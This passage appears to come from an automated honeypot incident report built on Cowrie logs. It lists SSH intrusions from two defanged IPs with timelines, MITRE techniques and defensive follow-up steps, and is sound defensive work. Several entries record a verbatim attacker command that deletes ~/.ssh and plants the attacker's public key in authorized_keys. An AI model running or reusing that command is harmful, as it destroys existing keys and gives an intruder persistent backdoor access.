| `2026-05-22 15:41:04` | `cowrie.session.params` |
| `2026-05-22 15:41:04` | `cowrie.command.input` |
| `2026-05-22 15:41:04` | `cowrie.session.file_download` |
| `2026-05-22 15:41:04` | `cowrie.log.closed` |
| `2026-05-22 15:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e70253e4a0

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:41 |
| **Last Seen** | 2026-05-22 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:41:07` | `cowrie.session.connect` |
| `2026-05-22 15:41:07` | `cowrie.client.version` |
| `2026-05-22 15:41:07` | `cowrie.client.kex` |
| `2026-05-22 15:41:08` | `cowrie.login.success` |
| `2026-05-22 15:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9f5dc09aff

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:41 |
| **Last Seen** | 2026-05-22 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:41:08` | `cowrie.session.connect` |
| `2026-05-22 15:41:08` | `cowrie.client.version` |
| `2026-05-22 15:41:08` | `cowrie.client.kex` |
| `2026-05-22 15:41:09` | `cowrie.login.success` |
| `2026-05-22 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583b9dd101ec

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:46 |
| **Last Seen** | 2026-05-22 15:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:46:18` | `cowrie.session.connect` |
| `2026-05-22 15:46:18` | `cowrie.client.version` |
| `2026-05-22 15:46:18` | `cowrie.client.kex` |
| `2026-05-22 15:46:19` | `cowrie.login.success` |
| `2026-05-22 15:46:19` | `cowrie.session.params` |
| `2026-05-22 15:46:19` | `cowrie.command.input` |
| `2026-05-22 15:46:19` | `cowrie.command.failed` |
| `2026-05-22 15:46:20` | `cowrie.log.closed` |
| `2026-05-22 15:46:20` | `cowrie.session.params` |
| `2026-05-22 15:46:20` | `cowrie.command.input` |
| `2026-05-22 15:46:20` | `cowrie.session.file_download` |
| `2026-05-22 15:46:20` | `cowrie.log.closed` |
| `2026-05-22 15:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a823e8cdf39

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:46 |
| **Last Seen** | 2026-05-22 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:46:23` | `cowrie.session.connect` |
| `2026-05-22 15:46:23` | `cowrie.client.version` |
| `2026-05-22 15:46:23` | `cowrie.client.kex` |
| `2026-05-22 15:46:24` | `cowrie.login.success` |
| `2026-05-22 15:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f81e43e6b31e

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:51 |
| **Last Seen** | 2026-05-22 15:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:51:19` | `cowrie.session.connect` |
| `2026-05-22 15:51:19` | `cowrie.client.version` |
| `2026-05-22 15:51:19` | `cowrie.client.kex` |
| `2026-05-22 15:51:20` | `cowrie.login.success` |
| `2026-05-22 15:51:21` | `cowrie.session.params` |
| `2026-05-22 15:51:21` | `cowrie.command.input` |
| `2026-05-22 15:51:21` | `cowrie.command.failed` |
| `2026-05-22 15:51:21` | `cowrie.log.closed` |
| `2026-05-22 15:51:22` | `cowrie.session.params` |
| `2026-05-22 15:51:22` | `cowrie.command.input` |
| `2026-05-22 15:51:22` | `cowrie.session.file_download` |
| `2026-05-22 15:51:22` | `cowrie.log.closed` |
| `2026-05-22 15:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b5ec398a42e

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:51 |
| **Last Seen** | 2026-05-22 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:51:25` | `cowrie.session.connect` |
| `2026-05-22 15:51:25` | `cowrie.client.version` |
| `2026-05-22 15:51:25` | `cowrie.client.kex` |
| `2026-05-22 15:51:26` | `cowrie.login.success` |
| `2026-05-22 15:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077bd51c8744

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:54 |
| **Last Seen** | 2026-05-22 15:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:54:54` | `cowrie.session.connect` |
| `2026-05-22 15:54:54` | `cowrie.client.version` |
| `2026-05-22 15:54:54` | `cowrie.client.kex` |
| `2026-05-22 15:54:56` | `cowrie.login.success` |
| `2026-05-22 15:54:56` | `cowrie.session.params` |
| `2026-05-22 15:54:56` | `cowrie.command.input` |
| `2026-05-22 15:54:56` | `cowrie.command.failed` |
| `2026-05-22 15:54:57` | `cowrie.log.closed` |
| `2026-05-22 15:54:57` | `cowrie.session.params` |
| `2026-05-22 15:54:57` | `cowrie.command.input` |
| `2026-05-22 15:54:57` | `cowrie.session.file_download` |
| `2026-05-22 15:54:57` | `cowrie.log.closed` |
| `2026-05-22 15:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6066e5f6125

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:55 |
| **Last Seen** | 2026-05-22 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:55:01` | `cowrie.session.connect` |
| `2026-05-22 15:55:01` | `cowrie.client.version` |
| `2026-05-22 15:55:01` | `cowrie.client.kex` |
| `2026-05-22 15:55:02` | `cowrie.login.success` |
| `2026-05-22 15:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd109658755

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:56 |
| **Last Seen** | 2026-05-22 15:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:56:51` | `cowrie.session.connect` |
| `2026-05-22 15:56:51` | `cowrie.client.version` |
| `2026-05-22 15:56:51` | `cowrie.client.kex` |
| `2026-05-22 15:56:52` | `cowrie.login.success` |
| `2026-05-22 15:56:52` | `cowrie.session.params` |
| `2026-05-22 15:56:52` | `cowrie.command.input` |
| `2026-05-22 15:56:52` | `cowrie.command.failed` |
| `2026-05-22 15:56:52` | `cowrie.log.closed` |
| `2026-05-22 15:56:53` | `cowrie.session.params` |
| `2026-05-22 15:56:53` | `cowrie.command.input` |
| `2026-05-22 15:56:53` | `cowrie.session.file_download` |
| `2026-05-22 15:56:53` | `cowrie.log.closed` |
| `2026-05-22 15:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ffb26e4d17

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:56 |
| **Last Seen** | 2026-05-22 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:56:55` | `cowrie.session.connect` |
| `2026-05-22 15:56:55` | `cowrie.client.version` |
| `2026-05-22 15:56:56` | `cowrie.client.kex` |
| `2026-05-22 15:56:56` | `cowrie.login.success` |
| `2026-05-22 15:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c4e65993e3

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:58 |
| **Last Seen** | 2026-05-22 15:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:58:30` | `cowrie.session.connect` |
| `2026-05-22 15:58:30` | `cowrie.client.version` |
| `2026-05-22 15:58:30` | `cowrie.client.kex` |
| `2026-05-22 15:58:31` | `cowrie.login.success` |
| `2026-05-22 15:58:32` | `cowrie.session.params` |
| `2026-05-22 15:58:32` | `cowrie.command.input` |
| `2026-05-22 15:58:32` | `cowrie.command.failed` |
| `2026-05-22 15:58:32` | `cowrie.log.closed` |
| `2026-05-22 15:58:32` | `cowrie.session.params` |
| `2026-05-22 15:58:32` | `cowrie.command.input` |
| `2026-05-22 15:58:33` | `cowrie.session.file_download` |
| `2026-05-22 15:58:33` | `cowrie.log.closed` |
| `2026-05-22 15:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ea1fd66976

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:58 |
| **Last Seen** | 2026-05-22 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:58:36` | `cowrie.session.connect` |
| `2026-05-22 15:58:36` | `cowrie.client.version` |
| `2026-05-22 15:58:36` | `cowrie.client.kex` |
| `2026-05-22 15:58:37` | `cowrie.login.success` |
| `2026-05-22 15:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a484581dfa7

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:07 |
| **Last Seen** | 2026-05-22 16:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:07:27` | `cowrie.session.connect` |
| `2026-05-22 16:07:27` | `cowrie.client.version` |
| `2026-05-22 16:07:27` | `cowrie.client.kex` |
| `2026-05-22 16:07:28` | `cowrie.login.success` |
| `2026-05-22 16:07:29` | `cowrie.session.params` |
| `2026-05-22 16:07:29` | `cowrie.command.input` |
| `2026-05-22 16:07:29` | `cowrie.command.failed` |
| `2026-05-22 16:07:29` | `cowrie.log.closed` |
| `2026-05-22 16:07:29` | `cowrie.session.params` |
| `2026-05-22 16:07:29` | `cowrie.command.input` |
| `2026-05-22 16:07:29` | `cowrie.session.file_download` |
| `2026-05-22 16:07:29` | `cowrie.log.closed` |
| `2026-05-22 16:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a4aee3c6df

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:07 |
| **Last Seen** | 2026-05-22 16:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:07:32` | `cowrie.session.connect` |
| `2026-05-22 16:07:32` | `cowrie.client.version` |
| `2026-05-22 16:07:32` | `cowrie.client.kex` |
| `2026-05-22 16:07:33` | `cowrie.login.success` |
| `2026-05-22 16:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45aae6590c4

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:23 |
| **Last Seen** | 2026-05-22 16:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:23:13` | `cowrie.session.connect` |
| `2026-05-22 16:23:13` | `cowrie.client.version` |
| `2026-05-22 16:23:14` | `cowrie.client.kex` |
| `2026-05-22 16:23:14` | `cowrie.login.success` |
| `2026-05-22 16:23:15` | `cowrie.session.params` |
| `2026-05-22 16:23:15` | `cowrie.command.input` |
| `2026-05-22 16:23:15` | `cowrie.command.failed` |
| `2026-05-22 16:23:15` | `cowrie.log.closed` |
| `2026-05-22 16:23:15` | `cowrie.session.params` |
| `2026-05-22 16:23:15` | `cowrie.command.input` |
| `2026-05-22 16:23:16` | `cowrie.session.file_download` |
| `2026-05-22 16:23:16` | `cowrie.log.closed` |
| `2026-05-22 16:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171a972543ac

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:23 |
| **Last Seen** | 2026-05-22 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:23:18` | `cowrie.session.connect` |
| `2026-05-22 16:23:18` | `cowrie.client.version` |
| `2026-05-22 16:23:18` | `cowrie.client.kex` |
| `2026-05-22 16:23:19` | `cowrie.login.success` |
| `2026-05-22 16:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ad522bae72

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:28 |
| **Last Seen** | 2026-05-22 16:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:28:29` | `cowrie.session.connect` |
| `2026-05-22 16:28:29` | `cowrie.client.version` |
| `2026-05-22 16:28:29` | `cowrie.client.kex` |
| `2026-05-22 16:28:30` | `cowrie.login.success` |
| `2026-05-22 16:28:30` | `cowrie.session.params` |
| `2026-05-22 16:28:30` | `cowrie.command.input` |
| `2026-05-22 16:28:30` | `cowrie.command.failed` |
| `2026-05-22 16:28:30` | `cowrie.log.closed` |
| `2026-05-22 16:28:31` | `cowrie.session.params` |
| `2026-05-22 16:28:31` | `cowrie.command.input` |
| `2026-05-22 16:28:31` | `cowrie.session.file_download` |
| `2026-05-22 16:28:31` | `cowrie.log.closed` |
| `2026-05-22 16:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca624009d9a

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:28 |
